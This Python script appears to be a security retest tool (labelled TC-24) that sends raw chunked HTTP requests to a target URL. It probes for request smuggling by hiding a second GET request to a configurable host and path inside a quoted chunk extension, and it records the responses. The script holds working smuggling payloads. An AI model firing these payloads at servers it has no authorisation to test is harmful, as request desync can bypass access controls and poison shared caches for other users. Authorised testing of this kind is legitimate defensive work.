#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
from pathlib import Path

from http_probe_common import dump_json, ensure_dir, parse_url, save_raw_http_artifacts, send_raw_http, write_csv


def build_chunk_extension_cases(host: str, path: str, hidden_host: str, hidden_path: str) -> list[tuple[str, bytes]]:
    baseline = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: RETEST-TC24-SMUGGLE\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n\r\n"
        "1;foo=bar\r\n"
        "X\r\n"
        "0\r\n\r\n"
    ).encode("utf-8")
    quoted_string_crlf = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: RETEST-TC24-SMUGGLE\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n\r\n"
        '1;a="\r\n'
        "X\r\n"
        "0\r\n"
        "\r\n"
        f"GET {hidden_path} HTTP/1.1\r\n"
        f"Host: {hidden_host}\r\n"
        "X-Audit: RETEST-TC24-SMUGGLE\r\n"
        "Connection: close\r\n\r\n"
        '"\r\n'
        "Y\r\n"
        "0\r\n\r\n"
    ).encode("utf-8")
    escaped_lf = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: RETEST-TC24-SMUGGLE\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n\r\n"
        '1;a=" \\\n;\t"\r\n'
        "Y\r\n"
        "0\r\n\r\n"
    ).encode("utf-8")
    escaped_cr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: RETEST-TC24-SMUGGLE\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n\r\n"
        '1;a=" \\\r;\t"\r\n'
        "Y\r\n"
        "0\r\n\r\n"
    ).encode("utf-8")
    return [
        ("baseline_chunk_extension_token", baseline),
        ("quoted_string_crlf_smuggle_probe", quoted_string_crlf),
        ("quoted_string_escaped_lf_probe", escaped_lf),
        ("quoted_string_escaped_cr_probe", escaped_cr),
    ]


def summarize_response(response: bytes) -> dict[str, str]:
    notes: list[str] = []
    if not response:
        return {"notes": "no-bytes-returned", "http_code": "NO_RESPONSE"}
    http_markers = response.count(b"HTTP/")
    if http_markers > 1:
        notes.append(f"multi_http_markers={http_markers}")
    status_codes = [code.decode("ascii", errors="ignore") for code in re.findall(rb"HTTP/\d\.\d\s+(\d{3})", response)]
    if len(status_codes) > 1:
        notes.append("status_chain=" + ",".join(status_codes))
    return {
        "notes": " ".join(notes),
        "http_code": status_codes[0] if status_codes else "UNKNOWN",
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Run TC-24 quoted-string CRLF smuggling probes.")
    parser.add_argument("--url", required=True)
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--connect-host")
    parser.add_argument("--request-host")
    parser.add_argument("--hidden-host")
    parser.add_argument("--hidden-path", default="/")
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    out_dir = ensure_dir(args.output_dir)
    scheme, parsed_host, port, path = parse_url(args.url)
    request_host = args.request_host or parsed_host
    connect_host = args.connect_host or parsed_host
    hidden_host = args.hidden_host or request_host

    rows: list[dict[str, str]] = []
    summary = {"url": args.url, "cases": []}
    for name, request_bytes in build_chunk_extension_cases(request_host, path, hidden_host, args.hidden_path):
        out_prefix = out_dir / name
        response = send_raw_http(
            scheme=scheme,
            connect_host=connect_host,
            port=port,
            request_bytes=request_bytes,
            timeout=args.timeout,
            sni=request_host,
        )
        result = save_raw_http_artifacts(out_prefix, request_bytes.decode("latin-1", errors="replace"), response)
        interpretation = summarize_response(response)
        row = {
            "case": name,
            "http_code": interpretation["http_code"] or str(result["http_code"]),
            "server_header": str(result["server_header"]),
            "content_type": str(result["content_type"]),
            "body_fingerprint": str(result["body_fingerprint"]),
            "body_size": str(result["body_size"]),
            "notes": interpretation["notes"],
            "request_path": str(out_prefix.with_suffix(".request.txt")),
            "raw_response_path": str(result["raw_response_path"]),
        }
        summary["cases"].append(row)
        rows.append(row)

    dump_json(out_dir / "summary.json", summary)
    write_csv(
        out_dir / "summary.csv",
        [
            "case",
            "http_code",
            "server_header",
            "content_type",
            "body_fingerprint",
            "body_size",
            "notes",
            "request_path",
            "raw_response_path",
        ],
        rows,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
